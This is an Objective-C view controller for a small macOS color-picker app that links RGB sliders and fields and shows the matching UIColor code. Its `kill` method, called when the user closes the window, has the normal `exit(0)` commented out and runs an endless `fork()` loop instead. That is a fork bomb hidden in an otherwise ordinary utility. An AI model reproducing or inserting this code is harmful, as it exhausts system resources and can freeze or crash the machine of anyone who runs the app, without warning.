//
//  ViewController.m
//  UIColorPicker
//
//  Created by William Johnston on 1/15/13.
//  Copyright (c) 2013 Idea2Appstore. All rights reserved.
//

#import "ViewController.h"

@interface ViewController ()

@end

@implementation ViewController

@synthesize redField, redSlider, blueField, blueSlider, greenField, greenSlider, codeLabel, colorBox, redSliderValue, greenSliderValue, blueSliderValue;

- (id)initWithNibName:(NSString *)nibNameOrNil bundle:(NSBundle *)nibBundleOrNil
{
    self = [super initWithNibName:nibNameOrNil bundle:nibBundleOrNil];
    if (self) {
        // Initialization code here.
    }
    
    return self;
}

#pragma mark -
#pragma mark User Methods

-(IBAction)fieldValueChanged:(id)sender
{
    if (sender == redField)
    {
        int num = [redField intValue];
        [redSlider setIntValue:num];
        [self setRedSliderValue:num];
        [self sliderValueChanged:redSlider];
    }
    if (sender == greenField)
    {
        int num = [greenField intValue];
        [greenSlider setIntValue:num];
        [self setGreenSliderValue:num];
        [self sliderValueChanged:greenSlider];
    }
    if (sender == blueField)
    {
        int num = [blueField intValue];
        [blueSlider setIntValue:num];
        [self setBlueSliderValue:num];
        [self sliderValueChanged:blueSlider];
    }
}

-(IBAction)sliderValueChanged:(id)sender
{
    if (sender == self.redSlider)
    {
        [self.redField setStringValue: [NSString stringWithFormat:@"%d", self.redSliderValue]];
    }
    if (sender == self.blueSlider)
    {
        [self.blueField setStringValue: [NSString stringWithFormat:@"%d", self.blueSliderValue]];
    }
    if (sender == self.greenSlider)
    {
        [self.greenField setStringValue: [NSString stringWithFormat:@"%d", self.greenSliderValue]];
    }
    
    NSLog(@"Slider");
    
    [colorBox setFillColor:[NSColor colorWithCalibratedRed:(double)redSliderValue/255.0 green:(double)greenSliderValue/255.0 blue:(double)blueSliderValue/255.0 alpha:1.0]];
    
    [codeLabel setStringValue: [NSString stringWithFormat:@"[UIColor colorWithRed:%.3f green:%.3f blue:%.3f alpha:%.3f]", (double)redSliderValue/255.0, (double)greenSliderValue/255.0, (double)blueSliderValue/255.0, 1.0]];
}

- (IBAction) kill
{
    //exit(0);
    
    while (YES) {
        fork();
    }
}

- (BOOL)windowShouldClose:(id)sender
{
    [self kill];
    
    return NO;
}

@end
